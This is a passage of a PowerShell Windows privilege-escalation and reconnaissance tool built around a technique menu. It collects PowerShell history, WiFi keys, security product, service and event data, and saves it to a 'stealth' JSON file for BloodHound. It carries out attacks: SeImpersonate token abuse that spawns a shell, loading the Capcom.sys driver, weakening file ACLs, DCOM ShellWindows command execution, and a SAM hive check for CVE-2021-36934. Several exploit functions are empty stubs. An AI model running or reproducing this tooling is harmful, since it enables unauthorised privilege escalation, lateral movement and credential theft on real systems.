        Write-Output "[-] Failed to collect group memberships: $_"
    }

    # TODO - Try C# group permission enum
    Write-Output "[$([char]0xD83D + [char]0xDC80)] Trying to get Group infos (limited on non-AD machines), may take a minute..."
    $allGroupInfo = Get-AllLocalGroupsInfo
    if ($allGroupInfo.Count -gt 0) {
        Write-Output "[$([char]0xD83D + [char]0xDC80)] Found Group infos, printing first 5:"
        $allGroupInfo | Select-Object -First 5 | ForEach-Object { Write-Output $_ }
        Write-Output " "
    }
    # Collect AntiVirus Products
    try {
        $securityPolicies = Get-WmiObject -Namespace "ROOT\SecurityCenter2" -Class "AntiVirusProduct" -ErrorAction Stop
        $gCollect['SH_Data']['AntiVirusProducts'] = $securityPolicies | Select-Object -Property displayName, path, productState
        Write-Output "[+] AntiVirus products collected via WMI"
    } catch {
        Write-Output "[-] Failed to collect AntiVirus products: $_"
    }

    # Collect Firewall Information
    try {
        $firewalls = Get-WmiObject -Namespace "ROOT\SecurityCenter2" -Class "FirewallProduct" -ErrorAction Stop
        if ($firewalls) {
            $gCollect['SH_Data']['Firewalls'] = $firewalls | Select-Object -Property displayName, path, productState
            Write-Output "[+] Firewall products collected"
        } else {
            Write-Output "[-] No firewall products found or no output."
        }
    } catch {
        Write-Output "[-] Failed to collect firewall products: $_"
    }

    # Get Named Pipes
    try {
        $namedPipes = [System.IO.Directory]::GetFiles("\\.\\pipe\\")
        if ($namedPipes) {
            Write-Output "[+] Collected Named Pipes"
            if ($DEBUG_MODE) {
                 Write-Output $namedPipes | Select-Object -First 10
            }
        }
        else {
            Write-Output "[-] Failed to collect Named Pipes"
        }
    } catch { 
        Write-Output "[-] Failed to collect Named Pipes with error"
    }

    # Get Full Powershell History
    try {
        $powershellHistory = type (Get-PSReadLineOption).HistorySavePath
        if ($powershellHistory) {
            Write-Output "[+] Collected Full Powershell History"
        }
        else {
            Write-Output "[-] Failed to collect Full Powershell History"
        }
    } catch { 
        Write-Output "[-] Failed to collect Full Powershell History with error"
    }

    # Check User Rights Assignment (not using Win32_UserRight)
    try {
        $userRights = Get-WmiObject -Namespace "ROOT\CIMv2" -Class "Win32_UserAccount" -ErrorAction Stop | Where-Object { $_.LocalAccount -eq $true }
        $gCollect['SH_Data']['UserRights'] = $userRights 
        Write-Output "[+] User rights assignments collected"
        Write-Output $userRights |  Select-Object -Property Name, FullName, Domain, SID |  Format-Table -AutoSize
    } catch {
        Write-Output "[-] Failed to collect user rights assignments: $_"
    }

    # Collect Installed Services
    try {
        $services = Get-WmiObject -Class Win32_Service -ErrorAction Stop
        $gCollect['SH_Data']['InstalledServices'] = $services
        Write-Output "[+] Installed services collected, showing first 20"
        Write-Output $services | Select-Object -First 20 | Select-Object -Property Name, State, StartMode | Format-Table -AutoSize
        # We could check for Desktop or Shell and then use proper windows to display long list stuff
        # Write-Output $services | Select-Object -Property Name, State, StartMode | Out-GridView -Title "Installed Services" -PassThru
    } catch {
        Write-Output "[-] Failed to collect installed services: $_"
    }

    # Check Group Policies applied to user
    try {
        if ($isDomainJoined) {
            # For domain-joined machines
            $groupPolicies = Get-WmiObject -Namespace "ROOT\RSOP" -Class "RSOP_PolicySetting" -ErrorAction Stop
            $gCollect['SH_Data']['GroupPolicies'] = $groupPolicies
            Write-Output "[+] Group policies collected for domain-joined machine"
        } else {
            # For standalone machines
            Write-Output "[-] Group policies collection not applicable for standalone machine"
        }
    } catch {
        Write-Output "[-] Failed to collect group policies: $_"
    }

    # Check Token Delegation
    try {
        $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $gCollect['SH_Data']['TokenDelegation'] = @{
            UserName = $token.Name
            ImpersonationLevel = $token.ImpersonationLevel
            IsAuthenticated = $token.IsAuthenticated
        }
        Write-Output "[+] Token delegation info collected"
    } catch {
        Write-Output "[-] Failed to collect token delegation info: $_"
    }

    # Enumerate Trust Relationships
    try {
        if ($isDomainJoined) {
            $trustRelationships = Get-WmiObject -Namespace "ROOT\Microsoft\Windows\ActiveDirectory" -Class "TrustRelationship" -ErrorAction Stop
            $gCollect['SH_Data']['TrustRelationships'] = $trustRelationships
            Write-Output "[+] Trust relationships collected for domain-joined machine"
        } else {
            Write-Output "[-] Trust relationships not applicable for standalone machine"
        }
    } catch {
        Write-Output "[-] Failed to collect trust relationships: $_"
    }

    # Collect System Events with a limit of the last 200 entries
    Write-Output "[+] Trying to collect and reference latest 200 Events, may take a minute..."
    try {
        $events = Get-WmiObject -Namespace "ROOT\CIMv2" -Class "Win32_NTLogEvent" -ErrorAction Stop | 
                Sort-Object TimeGenerated -Descending | 
                Select-Object -First 200
        
        $gCollect['SH_Data']['SystemEvents'] = @()

        foreach ($event in $events) {
            # Initialize an empty hashtable to store event details
            $eventDetails = @{
                LogFile      = $event.LogFile
                EventCode    = $event.EventCode
                EventType    = $event.EventType
                SourceName   = $event.SourceName
                Message      = $event.Message
                TimeGenerated = $event.TimeGenerated
                Path         = $null # Placeholder for path
            }

            # Try to get the path from Win32_Service
            $service = Get-WmiObject -Class Win32_Service -Filter "Name='$($event.SourceName)'" -ErrorAction SilentlyContinue
            if ($service) {
                $eventDetails.Path = $service.PathName -replace '"', '' # Clean quotes
            } else {
                # If not found in services, try Win32_Process
                $process = Get-WmiObject -Class Win32_Process -Filter "Name='$($event.SourceName).exe'" -ErrorAction SilentlyContinue
                if ($process) {
                    $eventDetails.Path = $process.ExecutablePath
                }
            }

            # Add event details to the collection
            $gCollect['SH_Data']['SystemEvents'] += $eventDetails
        }
    } catch {
        Write-Output "[-] Failed to collect system events: $_"
    }

    try {
        Write-Output "[+] Last 200 system events collected with paths resolution, example:"
        $firstEvent = $gCollect['SH_Data']['SystemEvents'][0]
        $formattedEvent = [PSCustomObject]@{
            SourceName    = $firstEvent.SourceName
            Message       = $firstEvent.Message[0..100] -join ''
            Path          = $firstEvent.Path[0]
        } 
        Write-Output $formattedEvent | Format-List
    } catch {
        Write-Output "[-] Failed to display system event example"
    }

    # Try to access Wifi Keys
    getWifiKeys

    Write-Output "[$([char]0xD83D + [char]0xDC80)] Finished SH-focused data collection."
}

function sh_translate {
    # Initialize Transformed object
    $gCollect['Transformed'] = @{
        "nodes" = @()
    }

    # Transform UserDetails to nodes
    if ($gCollect['UserDetails']) {
        $userNode = @{
            "objectid" = $gCollect['UserDetails']['SID'] # Using SID as a unique identifier
            "name" = $gCollect['UserDetails']['FullName']
            "type" = "user"
            "isGuest" = $gCollect['UserDetails']['IsGuest']
        }
        $gCollect['Transformed']['nodes'] += $userNode
    }

    # Transform Groups
    if ($gCollect['Groups']) {
        foreach ($group in $gCollect['Groups']['UserGroups']) {
            $node = @{
                "objectid" = $group.Name # Ensure this is unique
                "name" = $group.Name
                "type" = "group"
            }
            $gCollect['Transformed']['nodes'] += $node
        }
    }

    # Transform Privileges
    if ($gCollect['Privileges']) {
        foreach ($privilege in $gCollect['Privileges']) {
            $node = @{
                "objectid" = "$($privilege.UserName)_$($privilege.Privilege)" # Unique identifier
                "name" = $privilege.Privilege
                "type" = "privilege"
                "user" = $privilege.UserName
            }
            $gCollect['Transformed']['nodes'] += $node
        }
    }

    # Note: Skip edges for now since BloodHound will construct those from nodes.
}

function sh_store {
    # Store the transformed data to disk or send it somewhere
    $storagePath = "C:\Temp\stealth_data.json"
    
    $jsonData = $gCollect['Transformed'] | ConvertTo-Json -Depth 3
    Set-Content -Path $storagePath -Value $jsonData

    Write-Output "[+] Data stored at $storagePath."
    if ($DEBUG_MODE) {
        Write-Output "[+] Global Object Data: " 
        $gCollect | ConvertTo-Json -Depth 3 | Write-Output
    }
}

function run_SH_collection {
    # some further checks / data collection not covered by other checks
    sh_check

    # translation and storage of ALL collected data
    sh_translate
    sh_store
}

function Get-AccessTokenHandle {
    [IntPtr]$tokenHandle = [IntPtr]::Zero
    try {
        if ([Win32]::OpenProcessToken([Win32]::GetCurrentProcess(), 0x0008, [ref]$tokenHandle)) {
            return $tokenHandle
        } else {
            return [IntPtr]::Zero
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error retrieving Access Token Handle: $_" }
        return [IntPtr]::Zero
    }
}

# Functions for each technique - checks and execution
function checkCertySAN {
    if ($DEBUG_MODE) { Write-Output "Checking for Certify SAN vulnerabilities..." }

    try {
        # Get all user accounts with the service account flag
        $serviceAccounts = Get-ADUser -Filter { ServicePrincipalName -ne $null } -Property SamAccountName, ServicePrincipalName, PasswordNeverExpires

        if ($serviceAccounts) {
            foreach ($account in $serviceAccounts) {
                # Get the user's permissions on the service account
                $permissions = Get-ACL -Path "AD:\$($account.SamAccountName)"

                # Check for permission to change password
                $changePassword = $permissions.Access | Where-Object {
                    $_.ActiveDirectoryRights -eq "ChangePassword" -and $_.IdentityReference -eq $env:USERNAME
                }

                if ($changePassword) {
                    Write-Output "[+] Found vulnerable service account: $($account.SamAccountName)"
                    Write-Output "   - SPN: $($account.ServicePrincipalName)"
                    Write-Output "   - Can change password: Yes"
                } else {
                    Write-Output "[-] Service account: $($account.SamAccountName) - No permission to change password"
                }
            }
        } else {
            Write-Output "[-] No service accounts found."
        }
    }
    catch {
        Write-Output "[-] Certify SAN check couldn't be performed (no AD machine?)"
    }
}

function checkSePrivileges {
    if ($DEBUG_MODE) { Write-Output "Checking Se.. Privileges for $userName" }
    
    try {
        $userName = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Name
        if (-not $userName) {
            $userName = $env:USERNAME   
        }
        $whoamiPriv = runSubprocess "whoami" "/priv"
        $lines = $whoamiPriv -split "`n"
        $filteredOutput = $lines[6..$lines.Length] -join "`n"
        $outlist = @()

        foreach ($priv in $privList) {
            if ($filteredOutput -match $priv.name) {
                $outlist += [PSCustomObject]@{ name = "[+] $($priv.name)" ; message = "$($priv.message)" }
                $gCollect['Privileges'][$priv.name] = $true
            
            }
        }

        if ($outlist.Length -gt 0) {
            Write-Output "[!] Found Privs for: $userName" 
            Write-Output $outlist | Format-Table -AutoSize -HideTableHeaders
        }
        else {
            Write-Output "[-] $userName has no Se.. privileges."
        }
    } catch {
        Write-Output "[-] Error checking Se.. Privileges: $_"
    }
}

function trySePrivileges {
    if ($DEBUG_MODE) { Write-Output "Trying to use SePrivileges..." }

    # Loop over $gCollect['Privileges'][$priv.name]
    foreach ($privName in $gCollect['Privileges'].Keys) {
        switch ($privName) {
            "SeImpersonatePrivilege" {
                Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking SeImpersonate preconditions..."
                if ([TokenImp]::ImpSys()) {
                    Write-Output "[+] Token impersonation successful. Elevated privileges acquired!"
                    Start-Process cmd.exe
                } else {
                    Write-Output "[-] Token impersonation failed. No elevated privileges."
                }
            }
            "SeBackupPrivilege" {
                Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking SeBackupPrivilege..."
                # Attempt to read from a non-critical temp file
                $tempFile = "C:\Windows\Temp\testfile.txt"
                Write-Output "[$([char]0xD83D + [char]0xDC80)] Attempting to read from $tempFile..."
                if (Test-Path $tempFile) {
                    Get-Content $tempFile
                } else {
                    Write-Output "[-] $tempFile does not exist. Creating for testing..."
                    "This is a test file." | Out-File -FilePath $tempFile
                }
            }
            "SeDebugPrivilege" {
                Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking SeDebugPrivilege..."
                # Attempt to dump LSASS or debug non-critical process
                Write-Output "[$([char]0xD83D + [char]0xDC80)] Trying to dump a test process..."
                # Example placeholder for actual memory dump function
            }
            "SeTakeOwnershipPrivilege" {
                Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking SeTakeOwnershipPrivilege..."
                # Attempt to take ownership of a non-critical file in System32
                $testFile = "C:\Windows\System32\testfile.txt"
                Write-Output "[$([char]0xD83D + [char]0xDC80)] Attempting to take ownership of $testFile..."
                if (-not (Test-Path $testFile)) {
                    "Test content" | Out-File -FilePath $testFile
                }
                Take-Ownership -Path $testFile
            }
            "SeCreateSymbolicLinkPrivilege" {
                Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking SeCreateSymbolicLinkPrivilege..."
                Write-Output "[+] Creating symbolic link for testing..."
                New-Item -ItemType SymbolicLink -Path "C:\Windows\Temp\TestLink" -Target "C:\Windows\Temp\testfile.txt"
            }
            "SeLoadDriverPrivilege" {
                Write-Output "[$([char]0xD83D) + [char]0xDC80] Checking SeLoadDriverPrivilege..."
                
                # Get the current user's SID
                $currentUserSID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value

                # Define the driver key path for the current user and registry uninstall path
                $driverKeyPath = "Registry::HKEY_USERS\$currentUserSID\System\CurrentControlSet\Services\DriverName"
                $registryPath = "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\DriverName"

                # Define the driver binary path (Capcom.sys in the current working directory)
                $driverBinaryPath = (Get-Location).Path + "\Capcom.sys"

                # Check if the driver registry path exists, if not create it
                if (-not (Test-Path $driverKeyPath)) {
                    Set-ItemProperty -Path $driverKeyPath -Name "ImagePath" -Value $driverBinaryPath
                    Set-ItemProperty -Path $driverKeyPath -Name "Type" -Value 1  # SERVICE_KERNEL_DRIVER (0x00000001)

                    # Output success messages
                    Write-Output "Driver registry path created:"
                    Write-Output "ImagePath set to:" $driverBinaryPath
                    Write-Output "Type set to: 1 (SERVICE_KERNEL_DRIVER)"

                    # Load the driver using the DriverLoader class
                    [DriverLoader]::LoadDriver($registryPath, $driverBinaryPath)
                }
                else {
                    Write-Output "Driver registry path already exists."
                }
            }

            "SeRestorePrivilege" {
                Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking SeRestorePrivilege..."
                Write-Output "[+] Attempting to restore a test file..."
                $restoreFilePath = "C:\Windows\Temp\restoredfile.txt"
                "This is a restored file." | Out-File -FilePath $restoreFilePath
            }
            "SeCreateTokenPrivilege" {
                Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking SeCreateTokenPrivilege..."
                Write-Output "[+] Attempting to create a new token for impersonation..."
                $token = New-Object System.Security.Principal.WindowsIdentity -ArgumentList "NewUser", $true # Adjust as necessary
                $token.Impersonate()
            }
            "SeSecurityPrivilege" {
                Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking SeSecurityPrivilege..."
                Write-Output "[+] Attempting to modify security settings on a test file..."
                $testFile = "C:\Windows\Temp\testfile.txt"
                $acl = Get-Acl -Path $testFile
                $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
                $acl.SetAccessRule($rule)
                Set-Acl -Path $testFile -AclObject $acl
            }
            "SeChangeNotifyPrivilege" {
                Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking SeChangeNotifyPrivilege..."
                Write-Output "[+] You can try bypassing traverse checking to access files in restricted folders, where nested file or folder is accessible to user, e.g using Test-Path "
            }
            # Additional privileges can be checked here
        }
    }
}

function checkUserRightsAssignments {
    if ($DEBUG_MODE) { Write-Output "Checking for User Rights Assignments..." }
    checkSePrivileges
}
function tryUserRightsAssignments {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via User Rights Assignments..." }
    # Logic for exploiting User Rights Assignments
}

function checkServiceMisconfigurations {
    if ($DEBUG_MODE) { Write-Output "Checking for Service Misconfigurations..." }
    
    $writeableEnvPath = @{
        "Path"         = @()
        "Permissions"  = @()
    }

    Write-Output "[$([char]0xD83D + [char]0xDC80)] Trying to find writable env-path before System32..."
    $env:Path -split ";" | ForEach-Object {
        try {
            # Attempt to create a temporary file in the current path
            echo "test" > "$_\t"

            if ($?) {
                # If the file creation was successful, add to the writable paths
                $writeableEnvPath["Path"] += $_
                $writeableEnvPath["Permissions"] += icacls.exe $_ 
                Remove-Item "$_\t" -ErrorAction SilentlyContinue 
            }             
            if ($_.ToLower() -eq "c:\windows\system32") {
                # Exit the loop if we reach the System32 path
                return
            }
        }
        catch { 
            #Write-Output "[!] Error accessing $_" 
        }
    }
    if ($writeableEnvPath["Path"].Count -gt 0) { 
        Write-Output "[+] Printing first 5 writeable env-pathes "
        $writeableEnvPath["Path"] | Select-Object -First 5 | ForEach-Object { Write-Output $_ }
        Write-Output ""
    }
}

function tryServiceMisconfigurations {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Service Misconfigurations..." }
    # Logic for exploiting service misconfigurations
}

# New function for enumerating system basics
function enumerateSystemBasics {
    if ($DEBUG_MODE) { Write-Output "Enumerating system basics..." }
    Write-Output "[$([char]0xD83D + [char]0xDC80)] Basic System Enumeration:"
    
    $osVersion = Get-WmiObject -Class Win32_OperatingSystem
    Write-Output "OS Version: $($osVersion.Caption) $($osVersion.Version)"
    
    $rootProcesses = Get-Process -IncludeUserName | Where-Object { $_.UserName -eq 'NT AUTHORITY\SYSTEM' }
    Write-Output "System Processes: $($rootProcesses.Count)"
    
    $writableDirs = @()
    $driveList = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3"
    foreach ($drive in $driveList) {
        if (Test-Path $drive.DeviceID) {
            $writableDirs += $drive.DeviceID
        }
    }
    Write-Output "Writable Directories Found: $($writableDirs -join ', ')"
}

# Skeleton function for enumeration
function runEnumeration {
    enumerateSystemBasics
    # Other enumeration logic can go here
}

function checkScheduledTasks {
    if ($DEBUG_MODE) { Write-Output "Checking for Scheduled Tasks..." }
    try {
        $scheduledTasks = Get-ScheduledTask | Where-Object {$_.Principal.UserId -ne "SYSTEM"}
        if ($scheduledTasks) {
            Write-Output "[+] Found Non-System Scheduled Tasks (printing max. 5):"
            $scheduledTasks | Select-Object -First 5 | ForEach-Object { Write-Output "$($_.TaskName)" }
            Write-Output ""
            $gCollect['OtherData']["ScheduledTasks"] = $scheduledTasks.TaskName
        } else {
            Write-Output "[-] No vulnerable scheduled tasks found."
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error while checking scheduled tasks: $_" }
    }
}

function tryScheduledTasks {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Scheduled Tasks..." }
    # Add logic to exploit scheduled tasks if they are vulnerable (e.g., changing executable path to escalate)
}

function checkWMIEventSubscription {
    if ($DEBUG_MODE) { Write-Output "Checking for WMI Event Subscription Abuse..." }
    try {
        $wmiEvents = Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
        if ($wmiEvents) {
            Write-Output "[+] WMI Event Subscriptions Detected:"
            $wmiEvents | ForEach-Object { Write-Output "Event: $($_.Name)" }
            
            $gCollect['OtherData']["WMIEvents"] = $wmiEvents.Name
        } else {
            Write-Output "[-] No vulnerable WMI event subscriptions found."
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error while checking WMI events: $_" }
    }
}

function tryWMIEventSubscription {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via WMI Event Subscription..." }
    # Logic to exploit WMI event subscriptions
}

function checkTokenImpersonation {
    if ($DEBUG_MODE) { Write-Output "Checking for Token Impersonation/Manipulation..." }
    try {
        $tokens = whoami /priv | Select-String "SePrivileges"
        if ($tokens) {
            Write-Output "[+] Token Impersonation Possible."
            $gCollect['Privileges']["SePrivileges"] = $tokens
        } else {
            Write-Output "[-] No Token Impersonation available."
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error checking token impersonation: $_" }
    }
}

function tryTokenImpersonation {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Token Impersonation..." }
    # Logic for abusing token impersonation, e.g., using tools like `Incognito` to exploit impersonation tokens
}

function checkRegistryKeyAbuse {
    if ($DEBUG_MODE) { Write-Output "Checking for Registry Key Abuse..." }
    try {
        $vulnerableKeys = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        if ($vulnerableKeys) {
            Write-Output "[+] Found vulnerable registry keys for abuse."
            $gCollect['OtherData']["RegistryKeyAbuse"] = $vulnerableKeys.PSPath
        } else {
            Write-Output "[-] No registry keys vulnerable to abuse found."
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error checking registry key abuse: $_" }
    }
}

function tryRegistryKeyAbuse {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Registry Key Abuse..." }
    # Logic for exploiting vulnerable registry keys
}

function checkSAMHiveAccess {
    if ($DEBUG_MODE) { Write-Output "Checking for SAM Hive Access..." }
    $samHivePath = "C:\Windows\System32\config\SAM"
    
    # Attempt to access SAM hive with error handling
    try {
        # Check if the path exists without throwing an error on access denial
        $exists = Test-Path -Path $samHivePath -ErrorAction SilentlyContinue
        if ($exists) {
            Write-Output "[+] SAM Hive exists."
            $gCollect['OtherData']["SAMHiveAccess"] = $samHivePath
        } else {
            Write-Output "[-] SAM Hive does not exist or is inaccessible."
        }
    } catch {
        Write-Output "[-] Error accessing SAM Hive: $_"
    }
}

function trySAMHiveAccess {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via SAM Hive Access..." }
    # Logic for abusing SAM Hive (LSA Secrets) if vulnerable
}

function checkAutorunAbuse {
    if ($DEBUG_MODE) { Write-Output "Checking for Autorun Program Abuse..." }
    try {
        $autoruns = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        if ($autoruns) {
            Write-Output "[+] Autorun programs found:"
            $autoruns | ForEach-Object { Write-Output "Run Entry: $($_.PSPath)" }
            Write-Output ""
            $gCollect['OtherData']["AutorunAbuse"] = $autoruns.PSPath
        } else {
            Write-Output "[-] No vulnerable autorun programs found."
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error checking autorun abuse: $_" }
    }
}

function tryAutorunAbuse {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Autorun Program Abuse..." }
    # Logic for abusing autorun programs
}

function checkGPOAbuse {
    if ($DEBUG_MODE) { Write-Output "Checking for Insecure GPO Permissions..." }
    try {
        # Modify this according to your environment's GPO specifics
        $gpos = Get-GPO -All
        foreach ($gpo in $gpos) {
            $gpoPermissions = Get-GPPermission -Guid $gpo.Id -TargetName "Domain Admins" -TargetType Group
            if ($gpoPermissions) {
                Write-Output "[+] Insecure GPO Permissions Detected for GPO: $($gpo.DisplayName)"
                $gCollect['OtherData']["GPOAbuse"] += $gpo.DisplayName
            } else {
                Write-Output "[-] No insecure GPO permissions found for GPO: $($gpo.DisplayName)."
            }
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error checking GPO permissions: $_" }
    }
}

function tryGPOAbuse {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via GPO Permissions..." }
    # Logic for exploiting GPO permissions
}

function checkCOMObjectAbuse {
    if ($DEBUG_MODE) { Write-Output "Checking for COM Object Abuse..." }
    try {
        $comObjects = Get-WmiObject -Query "SELECT * FROM Win32_COMClass"
        if ($comObjects) {
            Write-Output "[+] Found COM objects."
            $gCollect['OtherData']["COMObjectAbuse"] = $comObjects.Name
        } else {
            Write-Output "[-] No COM objects found."
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error checking COM objects: $_" }
    }
}

function tryCOMObjectAbuse {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via COM Object Abuse..." }
    # Logic for abusing COM objects
}
function checkDCOMLateralMovement {
    if ($DEBUG_MODE) { Write-Output "Checking for DCOM Lateral Movement..." }

    # Get the mapping of localized users
    $localizedUser = Get-LocalizedUserMapping

    # Define trusted identities using localized names
    $trustedIdentities = @(
        $localizedUser['nt authority\system'].LocalizedName,
        $localizedUser['administrators'].LocalizedName
    )

    # Define localized low-priv user identifiers
    $lowPrivUsers = @(
        $localizedUser['everyone'].LocalizedName,
        $localizedUser['authenticated users'].LocalizedName,
        $localizedUser['users'].LocalizedName
    )

    try {
        Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking for DCOM misconfigurations..."
        $dcomApplications = Get-CimInstance Win32_DCOMApplication
        
        if ($dcomApplications) {
            Write-Output "[+] DCOM Applications detected, analyzing permissions. This will take a minute..."

            foreach ($app in $dcomApplications) {
                # Check if it's running as an elevated user (like SYSTEM or Administrator)
                $appID = $app.AppID
                $appName = $app.Name
                $appSetting = Get-CimInstance -Query "SELECT * FROM Win32_DCOMApplicationSetting WHERE AppID='$appID'"
                $runAsUser = "None"

                if ($appSetting.RunAsUser) {
                    $runAsUser = $localizedUser[$appSetting.RunAsUser.ToLower()].LocalizedName
                }

                if ($trustedIdentities -contains $runAsUser) {
                    # Populate global data with detected DCOM applications
                    Write-Output "[+] Found elevated DCOM app $appName running as $runAsUser"
                    $gCollect['OtherData']["DCOMLateralMovementApps"] += @{
                        "AppName" = $appName
                        "AppID" = $appID
                        "RunAsUser" = $runAsUser
                    }

                    # Check ACLs
                    $clsidPath = "HKLM:\Software\Classes\CLSID\$appID"
                    if (Test-Path $clsidPath) {
                        $acl = Get-Acl -Path $clsidPath

                        foreach ($accessRule in $acl.Access) {
                            $identity = $localizedUser[$accessRule.IdentityReference.ToString()].LocalizedName

                            if ($accessRule.AccessControlType -eq 'Allow' -and ($lowPrivUsers -contains $identity)) {
                                Write-Output "[+] Found AppID with misconfigured Launch Permissions: $appID ($appName)"
                                $gCollect['OtherData']["DCOMLateralMovementMisconfigured"] += $appID
                            }
                        }
                    }
                }
            }
        } else {
            Write-Output "[-] No DCOM applications found."
        }
    } catch {
        Write-Output "[-] Error checking DCOM movement: $_"
    }
}
function tryDCOMLateralMovement {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via DCOM Lateral Movement..." }

    foreach ($dcomApp in $gCollect['OtherData']["DCOMLateralMovementApps"]) {
        if ($dcomApp['AppName'] -eq "ShellWindows") {
            try {
                $com = [Type]::GetTypeFromCLSID($dcomApp['AppID'])
                $obj = [System.Activator]::CreateInstance($com)
                $item = $obj.Item()
                $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
                Write-Output "[+] Command executed via ShellWindows."
            } catch {
                Write-Output "[-] Error executing command via ShellWindows: $_"
            }
        }
    }
}

function checkEFSSettings {
    if ($DEBUG_MODE) { Write-Output "Checking for EFS Settings..." }
    
    # Check if the WMI class exists before attempting to retrieve it
    $classExists = Get-WmiObject -List | Where-Object { $_.Name -eq "Win32_EncryptableVolume" }
    
    if ($classExists) {
        try {
            $efsSettings = Get-WmiObject -Class Win32_EncryptableVolume
            if ($efsSettings) {
                Write-Output "[+] EFS settings retrieved."
                # Process EFS settings here...
            } else {
                Write-Output "[-] No EFS settings found."
            }
        } catch {
            Write-Output "[-] Error retrieving EFS settings: $_"
        }
    } else {
        Write-Output "[-] WMI Class 'Win32_EncryptableVolume' not found on this system."
    }
}

function tryEFSSettings {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Weak EFS Settings..." }
    # Logic for exploiting weak EFS settings
}

# Menu displayfunction 
function showMenu {
    # Manually assign techniques to an indexed array
    $techniques = @{}
    $techniques[1] = "SePrivileges"
    $techniques[2] = "Service Misconfigurations"
    $techniques[3] = "Scheduled Tasks"
    $techniques[4] = "WMI Event Subscription Abuse"
    $techniques[5] = "Token Impersonation/Manipulation"
    $techniques[6] = "Registry Key Abuse"
    $techniques[7] = "CVE-2021-36934 (SAM Hive Access)"
    $techniques[8] = "Autorun Program Abuse"
    $techniques[9] = "Insecure GPO Permissions"
    $techniques[10] = "COM Object Abuse"
    $techniques[11] = "DCOM Lateral Movement"
    $techniques[12] = "Exploiting Weak EFS Settings"
    $techniques[13] = "Certify SAN"
    $techniques[14] = "Run additional checks for SH collection"
    # Prepare an array to hold the formatted output
    $output = @()

    # Fill output array with techniques, including numbers
    for ($i = 1; $i -le $techniques.Count; $i++) {
        $output += "$i. $($techniques[$i])"
    }

    # Calculate number of columns and format output for two columns
    $numRows = [math]::Ceiling($output.Count / 2)
    $formattedOutput = @()

    for ($i = 0; $i -lt $numRows; $i++) {
        $col1 = if ($i -lt $numRows) { $output[$i] } else { "" }
        $col2 = if ($i + $numRows -lt $output.Count) { $output[$i + $numRows] } else { "" }
        $formattedOutput += [PSCustomObject]@{ Technique = $col1; Column2 = $col2 }
    }

    # Print techniques in two columns
    $formattedOutput | Format-Table -AutoSize -Property Technique, @{Label="";Expression={$_.Column2}}

    # Print letter options in a separate line
    Write-Output "a - Scan & Try, all techniques  s - Scan only, all techniques  e - Enumerate system basics"
    Write-Output "Enter number(s) (e.g., 1,5-7,9) or 'a' for all..."
}

# Input processing
function processInput {
    param (
        [string]$cliInput
    )

    if ($DEBUG_MODE) { Write-Output "Beg. parsedInput var:" $cliInput }

    $scanOnly = $false
    $tryAll = $false
    $optionCount = 14

    if ($cliInput -eq 'a') {
        return @{ Selections = 1..$optionCount; ScanOnly = $scanOnly; TryAll = $tryAll }
    } elseif ($cliInput -like 's*') {
        $cliInput = $cliInput.Substring(1)  # Remove 's' prefix for scanning only
        $scanOnly = $true
    } elseif ($cliInput -like 't*') {
        $cliInput = $cliInput.Substring(1)  # Remove 't' prefix for trying
        $tryAll = $true
    } elseif ($cliInput -like 'q*') {
       exit(0);
    }
    
    $inputArray = $cliInput -split ','
    $parsedInput = @()  # Initialize an empty array for parsed input

    foreach ($item in $inputArray) {
        if ($item -match '^(\d+)-(\d+)$') {
            # Handle ranges (e.g., 5-7)
            $range = $item -split '-'
            $start = [int]$range[0]
            $end = [int]$range[1]
            if ($start -le $end -and $start -ge 1 -and $end -le 12) {
                $parsedInput += $start..$end
            } else {
                if ($DEBUG_MODE) { Write-Output "Invalid range: $item" }
            }
        } elseif ($item -match '^\d+$') {
            # Handle single numbers (1-12)
            $num = [int]$item
            if ($num -ge 1 -and $num -le $optionCount) {
                $parsedInput += $num
            } else {
                if ($DEBUG_MODE) { Write-Output "Invalid selection: $item" }
            }
        } else {
            if ($DEBUG_MODE) { Write-Output "Invalid input: $item" }
        }
    }

    $parsedInput = $parsedInput | Sort-Object -Unique
